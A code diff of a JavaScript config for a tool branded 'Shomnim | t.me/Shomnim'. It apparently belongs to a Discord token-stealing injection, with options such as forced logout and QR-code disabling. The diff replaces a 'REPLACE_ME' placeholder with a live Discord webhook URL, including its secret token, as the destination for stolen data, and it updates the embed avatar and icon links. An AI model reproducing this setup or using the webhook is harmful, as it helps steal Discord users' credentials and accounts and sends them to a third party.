@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "Shomnim",
 
-    webhook: "REPLACE_ME",
+    webhook: "https://discord.com/api/webhooks/1111912848763920434/n4mw9g9K8GYvz5VfUv94lzwLXnHnNd21gr8AYbHJu0-n6cYO_5FFxDKKhvyk1CY2gMN7",
 
     logout: true,
     disable_qr_code: true,
@@ -26,10 +26,10 @@ var config = {
         username: "Shomnim | t.me/Shomnim",
         footer: {
             text: `Shomnim | t.me/Shomnim`,
-            icon_url: "https://cdn.discordapp.com/avatars/787748982490398740/7f9bd7b0b42480e8395d01303eca3980.webp?size=128",
+            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
         href: "https://t.me/Shomnim",
-        avatar_url: "https://cdn.discordapp.com/avatars/787748982490398740/7f9bd7b0b42480e8395d01303eca3980.webp?size=128"
+        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
     badges: {
